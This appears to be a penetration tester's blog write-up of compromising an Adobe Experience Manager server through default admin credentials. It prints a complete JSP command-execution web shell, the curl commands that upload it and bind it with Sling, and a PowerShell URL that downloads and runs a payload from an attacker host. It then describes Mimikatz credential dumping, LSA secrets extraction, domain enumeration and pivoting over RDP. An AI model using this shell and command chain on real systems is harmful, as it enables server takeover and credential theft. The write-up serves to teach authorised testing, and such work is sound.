---
title: Adobe Experience Manager Exploitation
description: >-
  I was recently working on an external penetration testing assessment in which
  the only information provided to me was the IP address rangeâ€¦
image: images/blog/AEM.jpeg
date: '2020-01-10T18:52:27.154Z'
categories: []
keywords: []

---

I was recently working on an external penetration testing assessment in which the only information provided to me was the IP address range. During the initial phase of active enumeration and information gathering, I enumerated subdomains, port-scanned, explored services and carried out several OSINT techniques.

A list of resources was compiled and ranked based on several factors including data like leaked credentials, outdated software, exposed services, etc.

In this activity, I identified a running Adobe Experience Manager Instance. Then I gathered more information about AEM like default credentials, any publicly known exploit and version details of AEM.

![_Figure 1: Adobe Experience ManagerÂ Login_](/images/blog/1____f32f9IdCAw60hfg__3__6PA.png)
_Figure 1: Adobe Experience ManagerÂ Login_

This AEM instance was installed with a default configuration and default credentials were working, I logged into AEM with the default user. ğŸ˜Š

![_Figure 2: AEM DefaultÂ Login_](/images/blog/1__0wKLemm6UREx__U5UHf4l1Q.png)
_Figure 2: AEM DefaultÂ Login_

In further reconnaissance, I identified a potential AEM RCE vulnerability. [Mikhail Egorov](https://www.slideshare.net/0ang3el?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideview) has presented AEM Exploitation in PHDays Security Conference and focused my efforts to exploit this vulnerability.

AEM has a feature called â€˜RCETYPEâ€™, which can be used to get access to the server. I created a new â€˜RCETYPEâ€™ and used a sling operator which offers an adapter pattern to conveniently translate objects that implement the adaptable interface.

The exploitation required multiple steps to be executed as listed below:

1.  _Create a Folder RCETYPE_
2.  _Upload the JSP shell to a specific path_
3.  _Move the app to a specific location._

I have used following commands to create a malicious RCETYPE

*   I have created a folder â€œRCETYPEâ€

**_curl â€“u admin:admin â€“Fjcr:primaryType=nt:folder_** [**_http://IPAddress/content/rcetype_**](http://ipaddress/content/rcetype)

![_Figure 3: NodeÂ Created_](/images/blog/1__JeoJPN6doUE__7q__rgN0gCw.png)
_Figure 3: NodeÂ Created_

*   I then uploaded a jsp shell to rcetype node.

**_curl â€“u admin:admin â€“Fexec.jsp=@RCE.jsp_** [**_http://IP_**](http://IP) **_Address /content/rcetype_**

The jsp shell (shown below) was then used in order to try and execute operating system commands.

**_<%@ page import=â€java.util.\*,java.io.\*,java.net.\*â€%>  
<%  
//  
// JSP\_KIT  
//  
// cmd.jsp = Command Execution (win32)  
//  
// by: Unknown  
// modified: 27/06/2003  
//  
%>  
<HTML><BODY>  
<FORM METHOD=â€POSTâ€ NAME=â€myformâ€ ACTION=â€â€>  
<INPUT TYPE=â€textâ€ NAME=â€cmdâ€>  
<INPUT TYPE=â€submitâ€ VALUE=â€Sendâ€>  
</FORM>  
<pre>  
<%  
if (request.getParameter(â€œcmdâ€)Â != null) {  
out.println(â€œCommand: â€œ + request.getParameter(â€œcmdâ€) + â€œ\\n<BR>â€);  
Process p = Runtime.getRuntime().exec(â€œcmd.exe /c â€œ + request.getParameter(â€œcmdâ€));  
OutputStream os = p.getOutputStream();  
InputStream in = p.getInputStream();  
DataInputStream dis = new DataInputStream(in);  
String disr = dis.readLine();  
while ( disrÂ != null ) {  
out.println(disr); disr = dis.readLine(); }  
}  
%>  
</pre>  
</BODY></HTML>_**

The shell code could then be used to execute operating system commands.

*   Then I copied the rcetype to /apps.

**_curl â€“u admin:admin â€“F:operation=copy â€“F:dest=/apps/rcetype_** [**_http://IP_**](http://IP) **_Address /content/rcetype_**

*   I used sling to create a rce node bound to rcetype.

**_curl â€“u admin:admin â€“Fsling:resourceType=rcetype_** [**_http://IP_**](http://IP) **_Address/content/rce_**

*   I was able to launch the jsp script for code execution ğŸ˜Š

**_curl â€“X â€œGETâ€_** [**_http://IP_**](http://IP) **_Address /content/rce.exec Or Open this link in browser_**

![_Figure 4: CommandÂ Shell_](/images/blog/1__4vAvr__H2SFdUcO__QKiQnAw.png)
_Figure 4: CommandÂ Shell_

My next step was to achieve better control via an interactive shell. To convert this command shell to a meterpreter shell I relied on â€œexploit/multi/script/web\_deliveryâ€ Metasploit exploit.

**http://<target> /content/rce.exec?cmd=powershell.exe%20-nop%20-w%20hidden%20-c%20$D=new-object%20net.webclient;$D.proxy=\[Net.WebRequest\]::GetSystemWebProxy();$D.Proxy.Credentials=\[Net.CredentialCache\]::DefaultCredentials;IEX%20$D.downloadstring(%27http://<attacker>%27);**

![Figure 5: Meterpreter Session](/images/blog/1__HjQY3rzubiWZfkz20dt__0Q.png)
Figure 5: Meterpreter Session

Using this meterpreter shell I fiddled with the compromised system and looked around for anything that could help me during post-exploitation. I got a meterpreter shell for a user who had local admin rights which then elevated to a SYSTEM shell.

![Figure 6: CurrentÂ User](/images/blog/1__wdAvcOVrsYPGT4wCud51cw.png)
Figure 6: CurrentÂ User

Then I dumped hashes, tried to fetch clear text passwords using Mimikatz, extract delegation tokens and used post exploitation modules like lsa\_secrets which gave me working clear-text credentials for one of the users.

![Figure 7: LSAÂ Secrets](/images/blog/1__rQpdllogOl__RdlXC6GLXnQ.png)
Figure 7: LSAÂ Secrets![Figure 8: MimikatzÂ Output](/images/blog/1__ZsY1MSvWFqcj__olUinENew.png)
Figure 8: MimikatzÂ Output![Figure 9: CacheÂ Dump](/images/blog/1__OW0xpEKRwbTB1hcxGFWUWQ.png)
Figure 9: CacheÂ Dump

As the compromised host was in a domain, I used a meterpreter shell to enumerate more about the domain (i.e. users, groups, password policy, DC)

![_Figure 10: DomainÂ Admins_](/images/blog/1__XxjnNhCz2PZj7hmaRgxC0A.png)
_Figure 10: DomainÂ Admins_

Then I enumerated the password policy details using the obtained credentials. Seeing the password policy did implement lockout I ruled out password brute force.

![Figure 11: Domain Account and Password PolicyÂ Details](/images/blog/1__e__yn__YM3neP0TWvmRnVd7g.png)
Figure 11: Domain Account and Password PolicyÂ Details

I performed an ARP scan to identify live hosts on the network using a post-exploitation Metasploit module and identified multiple hosts and started performing internal scans for the most common services (i.e SMB, SSH, RDP, etc.)

![Figure 12: Internal NetworkÂ Scan](/images/blog/1__iu6uJAdL1smwPYr4HuL8RA.png)
Figure 12: Internal NetworkÂ Scan

Further analysis didnâ€™t reveal much attack surface hence I focused on single user and system where I had access. With clear text credentials at hand, it was easier to investigate the box using RDP Access. Hence RDP access was obtained leveraging port forwarding. Then I did port forwarding and took RDP access of the compromised system using the compromised credentials which we got from the Metasploit post exploitation module (lsa\_secrets)

![Figure 13: Port Forwarding](/images/blog/1__XU6v8k3x5hK0xJYTwlXHpg.png)
Figure 13: Port Forwarding![Figure 14: RDPÂ Session](/images/blog/1__AXTUNnu__snsBXw64MBIQpg.png)
Figure 14: RDPÂ Session

During further recon, I identified sensitive information stored in the config file and saved credentials.

![Figure 15: Password Stored in ConfigÂ File](/images/blog/1__1cxP1rD0__JoSyseY17__b__A.png)
Figure 15: Password Stored in ConfigÂ File![Figure 16: StoredÂ Password](/images/blog/1__zBWjQaJruYyy9fvJCR4SEw.png)
Figure 16: StoredÂ Password

I also found credentials in Browser Saved Passwords.

![Figure 17: Saved Password in WebÂ Browser](/images/blog/1__bTyWc3ScVxsSyo4gjNyiWQ.png)
Figure 17: Saved Password in WebÂ Browser

However, I had to stop the attack at this point as this didnâ€™t lead to any new target area and the client was interested in working on remediation.

Unfortunately, in this instance, I was not able to compromise the domain controller and therefore the entire domain, however as I have stated from the external network and due to default application install that came with a pre-installed account. I was able to gain internal network access.

HAPPY HUNTINGÂ :)